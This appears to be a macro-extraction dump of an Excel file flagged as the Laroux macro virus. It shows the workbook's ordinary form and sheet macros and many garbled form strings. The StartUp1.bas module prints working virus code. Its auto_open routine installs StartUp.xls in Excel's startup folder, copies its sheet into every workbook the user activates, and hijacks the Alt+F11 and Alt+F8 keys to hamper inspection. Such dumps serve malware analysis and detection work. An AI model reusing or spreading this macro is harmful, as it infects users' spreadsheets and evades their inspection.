in file: Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Private Sub Worksheet_SelectionChange(ByVal Target As Range)
ActiveSheet.Protect  '保护
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet7.cls 
in file: Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Private Sub Worksheet_SelectionChange(ByVal Target As Range)
ActiveSheet.Protect  '保护
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet8.cls 
in file: Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit



Private Sub Worksheet_BeforeDoubleClick(ByVal Target As Range, Cancel As Boolean)



End Sub

Private Sub Worksheet_SelectionChange(ByVal Target As Range)
 ActiveSheet.Protect  '保护
End Sub
-------------------------------------------------------------------------------
VBA MACRO Uf_ts.frm 
in file: Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039 - OLE stream: '_VBA_PROJECT_CUR/VBA/Uf_ts'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit


Private Sub 取消_Click()
sb_s.Value = False
sb_w.Value = False
Uf_ts.Hide

End Sub

Private Sub 确定_Click()

Uf_ts.Hide
End Sub
-------------------------------------------------------------------------------
VBA MACRO Chush.frm 
in file: Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039 - OLE stream: '_VBA_PROJECT_CUR/VBA/Chush'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Private Sub CshQued_Click()

Chush.Hide
End Sub

Private Sub CshQux_Click()
Huanban.Value = False
  Danwxx.Value = False
  Renyxx.Value = False
  Jiaofxx.Value = False


Chush.Hide
End Sub

Private Sub Danwxx_Click()
If Huanban.Value = True Then
  Danwxx.Value = True
  Renyxx.Value = True
  Jiaofxx.Value = True
End If
End Sub

Private Sub Huanban_Click()
If Huanban.Value = True Then
  Danwxx.Value = True
  Renyxx.Value = True
  Jiaofxx.Value = True
End If
End Sub

Private Sub Jiaofxx_Click()
If Huanban.Value = True Then
  Danwxx.Value = True
  Renyxx.Value = True
  Jiaofxx.Value = True
End If
End Sub

Private Sub Renyxx_Click()
If Huanban.Value = True Then
  Danwxx.Value = True
  Renyxx.Value = True
  Jiaofxx.Value = True
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO BanBen.frm 
in file: Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039 - OLE stream: '_VBA_PROJECT_CUR/VBA/BanBen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Shenbq.frm 
in file: Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039 - OLE stream: '_VBA_PROJECT_CUR/VBA/Shenbq'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Private Sub Qued_Click()
Shenbq.Hide

End Sub

Private Sub qx_Click()
rh.Value = ""
ee.Value = ""
Shenbq.Hide
End Sub

Private Sub UserForm_Activate()
rh.Value = Trim(Str(Sheets("主页").Cells(3, 5)))
ee.Value = Trim(Str(Sheets("主页").Cells(3, 6)))
End Sub



-------------------------------------------------------------------------------
VBA MACRO renyuanluru.frm 
in file: Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039 - OLE stream: '_VBA_PROJECT_CUR/VBA/renyuanluru'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Private Sub ComboBox1_Change()

End Sub
-------------------------------------------------------------------------------
VBA MACRO biandb.frm 
in file: Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039 - OLE stream: '_VBA_PROJECT_CUR/VBA/biandb'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Qued_Click()
biandb.Hide

End Sub

Private Sub qx_Click()
zeng.Value = False
jiang.Value = False
bian.Value = False

biandb.Hide
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039 - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO StartUp1.bas 
in file: Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039 - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
On Error Resume Next
If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
Application.ScreenUpdating = False
ThisWorkbook.Sheets("StartUp").Copy
ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
n$ = ActiveWorkbook.Name
ActiveWindow.Visible = False
Workbooks("StartUp.xls").Save
Workbooks(n$).Close (False)
End If
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub
Sub cop()
On Error Resume Next
If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
Application.ScreenUpdating = False
n$ = ActiveSheet.Name
Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
Sheets(n$).Select
End If
End Sub
Sub escape()
On Error Resume Next
Application.OnSheetActivate = "StartUp.xls!back"
Application.OnKey "%{F11}"
Application.OnKey "%{F8}"
Application.SendKeys "%{F11}"
Application.SendKeys "%{F8}"
For Each book In Workbooks
Application.DisplayAlerts = False
If book <> "StartUp.xls" Then book.Sheets("StartUp").Delete
Next
For Each book In Workbooks
If book.Name = "StartUp.xls" Then
book.Close
End If
Next
End Sub
Sub back()
On Error Resume Next
Application.OnKey "%{F8}", "StartUp.xls!escape"
Application.OnKey "%{F11}", "StartUp.xls!escape"
Application.OnSheetActivate = "StartUp.xls!cop"
Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!cop"
Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WARNING  The VBA code contains special characters such as backspace, that may be used for obfuscation.
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartU
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  XXXXXX
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ;
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ü~\x08T
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ØS
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - *Nº
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ãN
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - †Sò
' 0085     20 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - ºNXTü
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/BanBen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>y�O9�3u�b���R�]wQ0�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/BanBen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wiSO_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/BanBen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
6R\O:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/BanBen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ѐ�hSOE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/BanBen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wiSO_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/BanBen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wiSO_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/BanBen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�USMO:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/BanBen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^0W�e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/BanBen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�R@\t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/BanBen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wiSO_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/BanBen/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�_l0W
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Chush/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nd�USMO�Oo`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Chush/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nd��NXT�Oo`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Chush/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nd�49��Oo`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Chush/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nx�[q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Chush/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�mq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Chush/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	��b:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Chush/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Chush/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�eHr,gpenc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Shenbq/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3u�b@b^\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Shenbq/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nx�[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Shenbq/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Uf_ts/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nx�[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Uf_ts/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Uf_ts/i17/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q
N3u�b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Uf_ts/i17/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

N�3u�b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/biandb/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�XXT�NXT�Oo`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/biandb/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�QXT�NXT�Oo`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/biandb/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�NXT�S�f�Oo`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/biandb/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��	��b�bh��Q�[:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/biandb/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
nx�[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/biandb/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�YT�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wiSO_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,�

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���N��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���N��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f{|+RE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�NXT{|+RE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(u�]b_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7bM|{|�WE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�NXT�r
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�]D�;`��E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�R�]\Ot^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/renyuanluru/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�R�e��:
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/BanBen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/BanBen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/BanBen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/BanBen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/BanBen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Danwxx'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Chush'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Renyxx'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Chush'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Jiaofxx'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Chush'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CshQued'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Chush'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CshQux'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Chush'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Chush'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Huanban'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Chush'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Shenbq'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'rh'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Shenbq'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'2009'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ee'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Shenbq'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'12'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Shenbq'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSExcel.Laroux.ja-d22bb60db133cafc9b7beea3cd1c635db0076621b77d5aa24d3fbe89c9dc8039' - OLE stream: '_VBA_PROJECT_CUR/Shenbq'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
